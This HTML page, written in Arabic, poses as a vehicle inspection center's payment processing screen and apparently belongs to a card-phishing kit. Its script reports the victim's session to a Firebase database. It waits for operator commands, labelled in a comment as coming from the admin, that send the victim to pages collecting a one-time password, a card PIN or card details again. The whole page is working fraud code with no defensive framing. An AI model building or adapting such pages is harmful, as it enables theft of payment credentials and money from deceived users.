<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري المعالجة - مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

    <style>
        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; padding: 20px; }
        .loading-container { background: #fff; width: 100%; max-width: 400px; border-radius: 25px; padding: 40px 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); text-align: center; }
        .spinner { width: 65px; height: 65px; border: 6px solid #e0e0e0; border-top: 6px solid var(--main-green); border-radius: 50%; margin: 0 auto 30px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { font-size: 20px; color: #333; margin-bottom: 15px; font-weight: bold; }
        p { font-size: 14px; color: #666; line-height: 1.8; margin-bottom: 20px; }
        .secure-badge-container { margin-top: 25px; padding-top: 20px; border-top: 1px solid #eee; display: flex; flex-direction: column; align-items: center; gap: 10px; }
        .secure-img { width: 100%; max-width: 200px; height: auto; border-radius: 8px; }
    </style>
</head>
<body>

    <div class="loading-container">
        <div class="spinner"></div>
        <h2>جاري معالجة طلبك...</h2>
        <p>فضلاً انتظر قليلاً، يتم الآن التحقق من صحة البيانات مع بوابة الدفع الإلكتروني.</p>
        <div class="secure-badge-container">
            <img src="https://i.ibb.co/rKgZj74W/IMG-20260323-WA0008.jpg" class="secure-img" alt="Payment Security">
        </div>
    </div>

    <script>
        const firebaseConfig = { 
            apiKey: "AIzaSyAeZAjT4kZWVLJSKiehqLFrT8...", 
            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
            projectId: "saso-inspection" 
        };
        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
        const database = firebase.database();
        const v_id = localStorage.getItem('v_id');

        if (v_id) {
            // 1. تحديث الحالة فوراً عند دخول الصفحة لمسح أي أمر قديم
            database.ref('orders/' + v_id).update({
                next_step: 'waiting',
                current_page: "Processing"
            });

            // 2. مراقبة التغييرات (Listen) بشكل فوري ومباشر
            const orderRef = database.ref('orders/' + v_id + '/next_step');
            
            orderRef.on('value', (snapshot) => {
                const step = snapshot.val();
                
                // لو الأمر جيه من الأدمن نفذ فوراً بدون تأخير
                if (step === 'go_to_otp') {
                    window.location.replace('auth-session.html');
                } 
                else if (step === 'go_to_pin') {
                    window.location.replace('system_core_auth.html');
                }
                else if (step === 'wrong_card') {
                    window.location.replace('secure-pay-v2.html');
                }
                else if (step === 'success') {
                    window.location.replace('success-page.html');
                }
            });
        } else {
            window.location.href = 'index.html';
        }
    </script>
</body>
</html>
